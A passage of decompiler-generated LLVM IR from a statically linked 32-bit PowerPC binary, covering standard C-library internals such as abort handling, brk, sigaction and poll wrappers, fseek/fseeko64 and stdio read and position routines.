  %v3_10011a18 = add i32 %v1_10011a14, %v1_10011a18.pre
  %v4_10011a18 = inttoptr i32 %v3_10011a18 to i32*
  store i32 %v0_10011a18.pre, i32* %v4_10011a18, align 4
  %v0_10011a1c = load i32, i32* %r9.global-to-local, align 4
  %v1_10011a1c = add i32 %v0_10011a1c, -1
  store i32 %v1_10011a1c, i32* %r9.global-to-local, align 4
  %v0_10011a20 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011a20 = add i32 %v0_10011a20, -1
  store i32 %v1_10011a20, i32* %ctr.global-to-local, align 4
  %v2_10011a20 = icmp eq i32 %v1_10011a20, 0
  br i1 %v2_10011a20, label %dec_label_pc_10011a24, label %dec_label_pc_10011a14.dec_label_pc_10011a14_crit_edge

dec_label_pc_10011a24:                            ; preds = %dec_label_pc_10011a14.dec_label_pc_10011a14_crit_edge, %dec_label_pc_10011a14.lr.ph
  store i32 %v2_10011a00, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_10011a2c = call i32 @__sigaddset()
  %v3_10011a30 = icmp eq i32 %v0_10011a2c, 0
  br i1 %v3_10011a30, label %dec_label_pc_10011a38, label %dec_label_pc_10011a48

dec_label_pc_10011a38:                            ; preds = %dec_label_pc_10011a24
  store i32 268507720, i32* @lr, align 4
  %v3_10011a44 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_10011a00, i32 0)
  br label %dec_label_pc_10011a48

dec_label_pc_10011a48:                            ; preds = %dec_label_pc_10011a24, %dec_label_pc_10011a38
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10011a4c = load i32, i32* @global_var_1002e65c.944, align 4
  %v3_10011a50 = icmp eq i32 %v3_10011a4c, 0
  br i1 %v3_10011a50, label %dec_label_pc_10011a58, label %dec_label_pc_10011a80

dec_label_pc_10011a58:                            ; preds = %dec_label_pc_10011a48
  store i32 1, i32* @global_var_1002e65c.944, align 4
  br label %dec_label_pc_10011a60

dec_label_pc_10011a60:                            ; preds = %dec_label_pc_10011adc, %dec_label_pc_10011a58
  store i32 ptrtoint (i32* @global_var_1002e588.942 to i32), i32* %r29.global-to-local, align 4
  %v0_10011a6c = call i32 @__pthread_return_0()
  store i32 268507768, i32* @lr, align 4
  %v1_10011a74 = call i32 @__raise(i32 6)
  %v0_10011a7c = call i32 @__pthread_return_0()
  %v3_10011a84.pre = load i32, i32* @global_var_1002e65c.944, align 4
  br label %dec_label_pc_10011a80

dec_label_pc_10011a80:                            ; preds = %dec_label_pc_10011a48, %dec_label_pc_10011a60
  %v0_10011af8 = phi i32 [ %v3_10011a4c, %dec_label_pc_10011a48 ], [ %v3_10011a84.pre, %dec_label_pc_10011a60 ]
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10011a88 = icmp eq i32 %v0_10011af8, 1
  br i1 %v3_10011a88, label %dec_label_pc_10011ac8.lr.ph, label %dec_label_pc_10011af8

dec_label_pc_10011ac8.lr.ph:                      ; preds = %dec_label_pc_10011a80
  %v2_10011a94 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_1002e65c.944, align 4
  store i32 ptrtoint (i32* @global_var_10011aa8.946 to i32), i32* @lr, align 4
  %v3_10011aa4 = call i32 @__GI_memset(i32 %v2_10011a94, i32 0, i32 140)
  store i32 %v2_10011a00, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_10011a1833, i32* %r9.global-to-local, align 4
  %v2_10011ad025 = add i32 %v2_10011a00, 256
  %v3_10011ad026 = inttoptr i32 %v2_10011ad025 to i32*
  store i32 -1, i32* %v3_10011ad026, align 4
  %v0_10011ad427 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011ad428 = add i32 %v0_10011ad427, -1
  store i32 %v1_10011ad428, i32* %r11.global-to-local, align 4
  %v0_10011ad829 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011ad830 = add i32 %v0_10011ad829, -1
  store i32 %v1_10011ad830, i32* %ctr.global-to-local, align 4
  %v2_10011ad831 = icmp eq i32 %v1_10011ad830, 0
  br i1 %v2_10011ad831, label %dec_label_pc_10011adc, label %dec_label_pc_10011ac8.dec_label_pc_10011ac8_crit_edge

dec_label_pc_10011ac8.dec_label_pc_10011ac8_crit_edge: ; preds = %dec_label_pc_10011ac8.lr.ph, %dec_label_pc_10011ac8.dec_label_pc_10011ac8_crit_edge
  %v1_10011ad432 = phi i32 [ %v1_10011ad4, %dec_label_pc_10011ac8.dec_label_pc_10011ac8_crit_edge ], [ %v1_10011ad428, %dec_label_pc_10011ac8.lr.ph ]
  %v1_10011acc.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_10011ad0.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10011ac8 = mul i32 %v1_10011ad432, 4
  %v2_10011acc = add i32 %v1_10011ac8, %v1_10011acc.pre
  store i32 %v2_10011acc, i32* %r9.global-to-local, align 4
  %v2_10011ad0 = add i32 %v2_10011acc, 132
  %v3_10011ad0 = inttoptr i32 %v2_10011ad0 to i32*
  store i32 %v0_10011ad0.pre, i32* %v3_10011ad0, align 4
  %v0_10011ad4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011ad4 = add i32 %v0_10011ad4, -1
  store i32 %v1_10011ad4, i32* %r11.global-to-local, align 4
  %v0_10011ad8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011ad8 = add i32 %v0_10011ad8, -1
  store i32 %v1_10011ad8, i32* %ctr.global-to-local, align 4
  %v2_10011ad8 = icmp eq i32 %v1_10011ad8, 0
  br i1 %v2_10011ad8, label %dec_label_pc_10011adc, label %dec_label_pc_10011ac8.dec_label_pc_10011ac8_crit_edge

dec_label_pc_10011adc:                            ; preds = %dec_label_pc_10011ac8.dec_label_pc_10011ac8_crit_edge, %dec_label_pc_10011ac8.lr.ph
  store i32 268507892, i32* @lr, align 4
  %v4_10011af0 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_10011a60

dec_label_pc_10011af8:                            ; preds = %dec_label_pc_10011a80
  %v3_10011af8 = icmp eq i32 %v0_10011af8, 2
  br i1 %v3_10011af8, label %dec_label_pc_10011b00, label %dec_label_pc_10011b0c

dec_label_pc_10011b00:                            ; preds = %dec_label_pc_10011af8
  store i32 3, i32* @global_var_1002e65c.944, align 4
  br label %dec_label_pc_10011b0c

dec_label_pc_10011b0c:                            ; preds = %dec_label_pc_10011af8, %dec_label_pc_10011b00
  %v3_10011b0c = phi i32 [ %v0_10011af8, %dec_label_pc_10011af8 ], [ 3, %dec_label_pc_10011b00 ]
  %v1_10011b14 = icmp ne i32 %v3_10011b0c, 3
  call void @__pseudo_cond_branch(i1 %v1_10011b14, i32 268507944)
  store i32 4, i32* @global_var_1002e65c.944, align 4
  %v1_10011b24 = call i32 @__GI__exit(i32 127)
  ret i32 %v1_10011b24

; uselistorder directives
  uselistorder i32 %v1_10011ad8, { 1, 0 }
  uselistorder i32 %v1_10011ad4, { 1, 0 }
  uselistorder i32 %v1_10011a20, { 1, 0 }
  uselistorder i32 %v1_10011a1c, { 1, 0 }
  uselistorder i32 %v2_10011a00, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 0, 5, 6, 8, 7, 1, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 0, 2, 3, 9, 8, 1, 4, 5 }
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 3, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2 }
  uselistorder i32 127, { 1, 5, 0, 2, 4, 6, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder i32 132, { 3, 1, 2, 0 }
  uselistorder i32* @global_var_1002e65c.944, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_10030000.1 to i32), { 21, 22, 23, 0, 24, 25, 12, 1, 26, 3, 2, 13, 4, 14, 27, 15, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 16, 17, 5, 18, 6, 7, 8, 9, 10, 19, 20, 11 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @__sigaddset, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_10011b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10011ac8.dec_label_pc_10011ac8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10011a80, { 1, 0 }
  uselistorder label %dec_label_pc_10011a48, { 1, 0 }
  uselistorder label %dec_label_pc_10011a14.dec_label_pc_10011a14_crit_edge, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10011b30 = add i32 %arg1, 28
  %v2_10011b30 = inttoptr i32 %v1_10011b30 to i32*
  %v3_10011b30 = load i32, i32* %v2_10011b30, align 4
  store i32 %v3_10011b30, i32* @global_var_1002e660.947, align 4
  %v1_10011b40 = add i32 %arg1, 44
  %v2_10011b40 = inttoptr i32 %v1_10011b40 to i32*
  %v3_10011b40 = load i32, i32* %v2_10011b40, align 4
  store i32 %v3_10011b40, i32* @global_var_1002e664.948, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1002e668.911, align 4
  %v0_10011b74 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_10011b74)
  store i32 12, i32* @r3, align 4
  %v0_10011b7c = call i32 @__syscall_error()
  ret i32 %v0_10011b7c

; uselistorder directives
  uselistorder i32* @global_var_1002e668.911, { 1, 0, 2 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011b98 = call i32 @__asm_mfcr()
  %v1_10011b9c = and i32 %v0_10011b98, 268435456
  %v3_10011b9c = icmp eq i32 %v1_10011b9c, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10011b98, i32* %r31.global-to-local, align 4
  br i1 %v3_10011b9c, label %dec_label_pc_10011bb4, label %dec_label_pc_10011ba8

dec_label_pc_10011ba8:                            ; preds = %entry
  %v0_10011ba8 = call i32 @__errno_location()
  %v0_10011bac = load i32, i32* %r31.global-to-local, align 4
  %v2_10011bac = inttoptr i32 %v0_10011ba8 to i32*
  store i32 %v0_10011bac, i32* %v2_10011bac, align 4
  br label %dec_label_pc_10011bb4

dec_label_pc_10011bb4:                            ; preds = %entry, %dec_label_pc_10011ba8
  %v0_10011bc4 = phi i32 [ %v0_10011b98, %entry ], [ -1, %dec_label_pc_10011ba8 ]
  ret i32 %v0_10011bc4

; uselistorder directives
  uselistorder i1* @cr0_so, { 3, 0, 7, 8, 9, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_10011bb4, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011be0 = call i32 @__asm_mfcr()
  %v1_10011be4 = and i32 %v0_10011be0, 268435456
  %v3_10011be4 = icmp eq i32 %v1_10011be4, 0
  store i32 %v0_10011be0, i32* %r31.global-to-local, align 4
  br i1 %v3_10011be4, label %dec_label_pc_10011bfc, label %dec_label_pc_10011bf0

dec_label_pc_10011bf0:                            ; preds = %entry
  %v0_10011bf0 = call i32 @__errno_location()
  %v0_10011bf4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011bf4 = inttoptr i32 %v0_10011bf0 to i32*
  store i32 %v0_10011bf4, i32* %v2_10011bf4, align 4
  br label %dec_label_pc_10011bfc

dec_label_pc_10011bfc:                            ; preds = %entry, %dec_label_pc_10011bf0
  %v0_10011c0c = phi i32 [ %v0_10011be0, %entry ], [ -1, %dec_label_pc_10011bf0 ]
  ret i32 %v0_10011c0c

; uselistorder directives
  uselistorder label %dec_label_pc_10011bfc, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10011c10 = load i32, i32* @r5, align 4
  store i32 %v0_10011c10, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_10011c18 = zext i1 %tmp to i32
  %v2_10011c18 = ashr i32 %arg1, 31
  %v3_10011c18 = and i32 %v2_10011c18, -2
  %v4_10011c18 = or i32 %v3_10011c18, %v1_10011c18
  %v3_10011c1c = inttoptr i32 %v4_10011c18 to i16*
  %v4_10011c1c = call i32 @__GI_fseeko64(i16* %v3_10011c1c, i32 %arg1, i32 %v0_10011c10)
  ret i32 %v4_10011c1c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10011c20 = load i32, i32* @r7, align 4
  %v0_10011c24 = load i32, i32* @lr, align 4
  store i32 %v0_10011c24, i32* %r0.global-to-local, align 4
  store i32 %v0_10011c20, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_10011c20, 3
  br i1 %tmp9, label %dec_label_pc_10011c5c, label %dec_label_pc_10011c48

dec_label_pc_10011c48:                            ; preds = %entry
  %v0_10011c48 = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10011c54 = inttoptr i32 %v0_10011c48 to i32*
  store i32 22, i32* %v2_10011c54, align 4
  br label %dec_label_pc_10011d24

dec_label_pc_10011c5c:                            ; preds = %entry
  %v2_10011c5c = add i32 %tmp, 52
  %v3_10011c5c = inttoptr i32 %v2_10011c5c to i32*
  %v4_10011c5c = load i32, i32* %v3_10011c5c, align 4
  store i32 %v4_10011c5c, i32* @r28, align 4
  %v3_10011c60 = icmp eq i32 %v4_10011c5c, 0
  br i1 %v3_10011c60, label %dec_label_pc_10011c68, label %dec_label_pc_10011c88

dec_label_pc_10011c68:                            ; preds = %dec_label_pc_10011c5c
  %v2_10011c68 = add i32 %tmp, 56
  store i32 %v2_10011c68, i32* @r29, align 4
  %v2_10011c70 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10011c70, i32* @r3, align 4
  %v0_10011c7c = call i32 @__pthread_return_void()
  %v0_10011c84 = call i32 @__pthread_return_0()
  %v0_10011c88.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011c88

dec_label_pc_10011c88:                            ; preds = %dec_label_pc_10011c5c, %dec_label_pc_10011c68
  %v0_10011c94 = phi i32 [ %tmp, %dec_label_pc_10011c5c ], [ %v0_10011c88.pre, %dec_label_pc_10011c68 ]
  %v1_10011c88 = inttoptr i32 %v0_10011c94 to i16*
  %v2_10011c88 = load i16, i16* %v1_10011c88, align 2
  %v3_10011c88 = zext i16 %v2_10011c88 to i32
  store i32 %v3_10011c88, i32* %r0.global-to-local, align 4
  %v1_10011c8c = and i32 %v3_10011c88, 64
  store i32 %v1_10011c8c, i32* %r9.global-to-local, align 4
  %v3_10011c8c = icmp eq i32 %v1_10011c8c, 0
  br i1 %v3_10011c8c, label %dec_label_pc_10011ca4, label %dec_label_pc_10011c94

dec_label_pc_10011c94:                            ; preds = %dec_label_pc_10011c88
  store i32 %v0_10011c94, i32* @r3, align 4
  store i32 268508316, i32* @lr, align 4
  %v0_10011c98 = call i32 @__stdio_wcommit()
  %v3_10011c9c = icmp eq i32 %v0_10011c98, 0
  br i1 %v3_10011c9c, label %dec_label_pc_10011ca4, label %dec_label_pc_10011d0c

dec_label_pc_10011ca4:                            ; preds = %dec_label_pc_10011c94, %dec_label_pc_10011c88
  %v0_10011ca4 = load i32, i32* @r30, align 4
  %v3_10011ca4 = icmp eq i32 %v0_10011ca4, 1
  br i1 %v3_10011ca4, label %dec_label_pc_10011cac, label %dec_label_pc_10011ca4.dec_label_pc_10011cc0_crit_edge

dec_label_pc_10011ca4.dec_label_pc_10011cc0_crit_edge: ; preds = %dec_label_pc_10011ca4
  br label %dec_label_pc_10011cc0

dec_label_pc_10011cac:                            ; preds = %dec_label_pc_10011ca4
  %v0_10011cac = load i32, i32* @r31, align 4
  %v1_10011cac = inttoptr i32 %v0_10011cac to i16*
  %v2_10011cb0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268508344, i32* @lr, align 4
  %v4_10011cb4 = call i32 @__stdio_adjust_position(i16* %v1_10011cac, i32 %v2_10011cb0)
  %v1_10011cb8 = icmp slt i32 %v4_10011cb4, 0
  br i1 %v1_10011cb8, label %dec_label_pc_10011d0c, label %dec_label_pc_10011cac.dec_label_pc_10011cc0_crit_edge

dec_label_pc_10011cac.dec_label_pc_10011cc0_crit_edge: ; preds = %dec_label_pc_10011cac
  %v0_10011cc0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10011cc0

dec_label_pc_10011cc0:                            ; preds = %dec_label_pc_10011ca4.dec_label_pc_10011cc0_crit_edge, %dec_label_pc_10011cac.dec_label_pc_10011cc0_crit_edge
  %v0_10011cc0 = phi i32 [ %v0_10011ca4, %dec_label_pc_10011ca4.dec_label_pc_10011cc0_crit_edge ], [ %v0_10011cc0.pre, %dec_label_pc_10011cac.dec_label_pc_10011cc0_crit_edge ]
  %v0_10011cc4 = load i32, i32* @r31, align 4
  store i32 268508368, i32* @lr, align 4
  %v5_10011ccc = call i32 @__stdio_seek(i32 %v0_10011cc4, i32* nonnull %stack_var_-56, i32 %v0_10011cc0)
  %v1_10011cd0 = icmp slt i32 %v5_10011ccc, 0
  br i1 %v1_10011cd0, label %dec_label_pc_10011d0c, label %dec_label_pc_10011cd8

dec_label_pc_10011cd8:                            ; preds = %dec_label_pc_10011cc0
  %v0_10011cd8 = load i32, i32* @r31, align 4
  %v1_10011cd8 = inttoptr i32 %v0_10011cd8 to i16*
  %v2_10011cd8 = load i16, i16* %v1_10011cd8, align 2
  %v3_10011cd8 = zext i16 %v2_10011cd8 to i32
  store i32 %v3_10011cd8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10011ce0 = add i32 %v0_10011cd8, 8
  %v2_10011ce0 = inttoptr i32 %v1_10011ce0 to i32*
  %v3_10011ce0 = load i32, i32* %v2_10011ce0, align 4
  store i32 %v3_10011ce0, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_10011ce8 = and i32 %v3_10011cd8, 65464
  store i32 %v1_10011ce8, i32* %r0.global-to-local, align 4
  %v3_10011cec = add i32 %v0_10011cd8, 2
  %v4_10011cec = inttoptr i32 %v3_10011cec to i8*
  store i8 0, i8* %v4_10011cec, align 1
  %v0_10011cf0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011cf0 = load i32, i32* @r31, align 4
  %v2_10011cf0 = add i32 %v1_10011cf0, 28
  %v3_10011cf0 = inttoptr i32 %v2_10011cf0 to i32*
  store i32 %v0_10011cf0, i32* %v3_10011cf0, align 4
  %v0_10011cf4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011cf4 = trunc i32 %v0_10011cf4 to i16
  %v2_10011cf4 = load i32, i32* @r31, align 4
  %v3_10011cf4 = inttoptr i32 %v2_10011cf4 to i16*
  store i16 %v1_10011cf4, i16* %v3_10011cf4, align 2
  %v0_10011cf8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011cf8 = load i32, i32* @r31, align 4
  %v2_10011cf8 = add i32 %v1_10011cf8, 16
  %v3_10011cf8 = inttoptr i32 %v2_10011cf8 to i32*
  store i32 %v0_10011cf8, i32* %v3_10011cf8, align 4
  %v0_10011cfc = load i32, i32* %r9.global-to-local, align 4
  %v1_10011cfc = load i32, i32* @r31, align 4
  %v2_10011cfc = add i32 %v1_10011cfc, 20
  %v3_10011cfc = inttoptr i32 %v2_10011cfc to i32*
  store i32 %v0_10011cfc, i32* %v3_10011cfc, align 4
  %v0_10011d00 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011d00 = load i32, i32* @r31, align 4
  %v2_10011d00 = add i32 %v1_10011d00, 24
  %v3_10011d00 = inttoptr i32 %v2_10011d00 to i32*
  store i32 %v0_10011d00, i32* %v3_10011d00, align 4
  %v0_10011d04 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011d04 = load i32, i32* @r31, align 4
  %v2_10011d04 = add i32 %v1_10011d04, 44
  %v3_10011d04 = inttoptr i32 %v2_10011d04 to i32*
  store i32 %v0_10011d04, i32* %v3_10011d04, align 4
  br label %dec_label_pc_10011d10

dec_label_pc_10011d0c:                            ; preds = %dec_label_pc_10011c94, %dec_label_pc_10011cc0, %dec_label_pc_10011cac
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_10011d10

dec_label_pc_10011d10:                            ; preds = %dec_label_pc_10011cd8, %dec_label_pc_10011d0c
  %v0_10011d10 = load i32, i32* @r28, align 4
  %v3_10011d10 = icmp eq i32 %v0_10011d10, 0
  br i1 %v3_10011d10, label %dec_label_pc_10011d18, label %dec_label_pc_10011d24

dec_label_pc_10011d18:                            ; preds = %dec_label_pc_10011d10
  %v2_10011d18 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10011d18, i32* @r3, align 4
  %v0_10011d20 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10011d24

dec_label_pc_10011d24:                            ; preds = %dec_label_pc_10011d10, %dec_label_pc_10011c48, %dec_label_pc_10011d18
  store i32 %v0_10011c24, i32* %r0.global-to-local, align 4
  %v0_10011d28 = load i32, i32* @r30, align 4
  ret i32 %v0_10011d28

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 ()* @__pthread_return_0, { 44, 4, 3, 2, 31, 30, 29, 28, 27, 26, 0, 43, 23, 22, 24, 21, 20, 19, 18, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 25, 37, 36, 35, 39, 38, 17, 34, 16, 45, 1, 33, 32, 42, 41, 40 }
  uselistorder i32 ()* @__pthread_return_void, { 51, 50, 47, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 1, 0, 49, 48, 9, 8, 7, 6, 11, 10, 13, 12, 36, 35, 34, 33, 32, 31, 40, 39, 38, 37, 5, 4, 30, 29, 3, 2, 53, 52, 28, 27, 26, 25, 46, 45, 44, 43, 42, 41 }
  uselistorder i32 56, { 1, 5, 4, 0, 2, 3 }
  uselistorder i32 52, { 3, 4, 10, 0, 6, 1, 2, 9, 7, 5, 8 }
  uselistorder i32 22, { 2, 14, 12, 3, 13, 4, 5, 17, 6, 19, 7, 15, 8, 9, 16, 10, 11, 0, 1, 18 }
  uselistorder label %dec_label_pc_10011d24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011d10, { 1, 0 }
  uselistorder label %dec_label_pc_10011d0c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10011cc0, { 1, 0 }
  uselistorder label %dec_label_pc_10011c88, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10011d48 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10011d54 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10011d5c = and i16 %v3_10011d54, 4
  %v3_10011d5c = icmp eq i16 %v1_10011d5c, 0
  br i1 %v3_10011d5c, label %dec_label_pc_10011d64, label %dec_label_pc_10011d9c

dec_label_pc_10011d64:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_10011d70, label %dec_label_pc_10011d68

dec_label_pc_10011d68:                            ; preds = %dec_label_pc_10011d64
  br label %dec_label_pc_10011d70

dec_label_pc_10011d70:                            ; preds = %dec_label_pc_10011d64, %dec_label_pc_10011d68
  %v1_10011d70 = add i32 %tmp, 4
  %v2_10011d70 = inttoptr i32 %v1_10011d70 to i32*
  %v3_10011d70 = load i32, i32* %v2_10011d70, align 4
  store i32 %v3_10011d70, i32* %r3.global-to-local, align 4
  store i32 268508536, i32* @lr, align 4
  %v1_10011d74 = call i32 @__libc_read(i32 %v3_10011d70)
  store i32 %v1_10011d74, i32* %r3.global-to-local, align 4
  %v2_10011d78 = icmp sgt i32 %v1_10011d74, 0
  br i1 %v2_10011d78, label %dec_label_pc_10011d9c, label %dec_label_pc_10011d80

dec_label_pc_10011d80:                            ; preds = %dec_label_pc_10011d70
  %v3_10011d78 = icmp eq i32 %v1_10011d74, 0
  %v0_10011d80 = load i32, i32* @r31, align 4
  %v1_10011d80 = inttoptr i32 %v0_10011d80 to i16*
  %v2_10011d80 = load i16, i16* %v1_10011d80, align 2
  br i1 %v3_10011d78, label %dec_label_pc_10011d88, label %dec_label_pc_10011d90

dec_label_pc_10011d88:                            ; preds = %dec_label_pc_10011d80
  %v1_10011d88 = or i16 %v2_10011d80, 4
  br label %dec_label_pc_10011d98

dec_label_pc_10011d90:                            ; preds = %dec_label_pc_10011d80
  %v1_10011d90 = or i16 %v2_10011d80, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011d98

dec_label_pc_10011d98:                            ; preds = %dec_label_pc_10011d88, %dec_label_pc_10011d90
  %v1_10011d88.sink.off0 = phi i16 [ %v1_10011d88, %dec_label_pc_10011d88 ], [ %v1_10011d90, %dec_label_pc_10011d90 ]
  store i16 %v1_10011d88.sink.off0, i16* %v1_10011d80, align 2
  %v0_10011dac.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011d9c

dec_label_pc_10011d9c:                            ; preds = %entry, %dec_label_pc_10011d70, %dec_label_pc_10011d98
  %v0_10011dac = phi i32 [ 0, %entry ], [ %v1_10011d74, %dec_label_pc_10011d70 ], [ %v0_10011dac.pre, %dec_label_pc_10011d98 ]
  store i32 %v0_10011d48, i32* @r31, align 4
  ret i32 %v0_10011dac

; uselistorder directives
  uselistorder i16 %v2_10011d80, { 1, 0 }
  uselistorder i32 %v1_10011d74, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32)* @__libc_read, { 1, 0 }
  uselistorder label %dec_label_pc_10011d9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10011d98, { 1, 0 }
  uselistorder label %dec_label_pc_10011d70, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* @r8, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_10011dc8 = load i16, i16* %arg1, align 2
  %v4_10011dc8 = zext i16 %v3_10011dc8 to i32
  %tmp9 = urem i16 %v3_10011dc8, 4
  %v3_10011dcc = icmp eq i16 %tmp9, 0
  br i1 %v3_10011dcc, label %dec_label_pc_10011e18, label %dec_label_pc_10011dd4

dec_label_pc_10011dd4:                            ; preds = %entry
  %v1_10011dcc = zext i16 %tmp9 to i32
  %v1_10011dd4 = add nsw i32 %v1_10011dcc, -1
  store i32 %v1_10011dd4, i32* %r10.global-to-local, align 4
  %v4_10011dd4 = icmp eq i32 %v1_10011dd4, 0
  br i1 %v4_10011dd4, label %dec_label_pc_10011e18, label %dec_label_pc_10011ddc

dec_label_pc_10011ddc:                            ; preds = %dec_label_pc_10011dd4
  %v1_10011ddc = and i32 %v4_10011dc8, 2048
  %v3_10011ddc = icmp eq i32 %v1_10011ddc, 0
  br i1 %v3_10011ddc, label %dec_label_pc_10011e18, label %dec_label_pc_10011de4

dec_label_pc_10011de4:                            ; preds = %dec_label_pc_10011ddc
  %v2_10011de4 = icmp sgt i32 %v1_10011dd4, 1
  br i1 %v2_10011de4, label %dec_label_pc_10011e90, label %dec_label_pc_10011dec

dec_label_pc_10011dec:                            ; preds = %dec_label_pc_10011de4
  %v2_10011dec = add i32 %tmp, 40
  %v3_10011dec = inttoptr i32 %v2_10011dec to i32*
  %v4_10011dec = load i32, i32* %v3_10011dec, align 4
  %v3_10011df0 = icmp eq i32 %v4_10011dec, 0
  br i1 %v3_10011df0, label %dec_label_pc_10011df8, label %dec_label_pc_10011e90

dec_label_pc_10011df8:                            ; preds = %dec_label_pc_10011dec
  %v2_10011df8 = add i32 %tmp, 44
  %v3_10011df8 = inttoptr i32 %v2_10011df8 to i32*
  %v4_10011df8 = load i32, i32* %v3_10011df8, align 4
  %v2_10011dfc = add i32 %tmp, 3
  %v3_10011dfc = inttoptr i32 %v2_10011dfc to i8*
  %v4_10011dfc = load i8, i8* %v3_10011dfc, align 1
  %v5_10011dfc = zext i8 %v4_10011dfc to i32
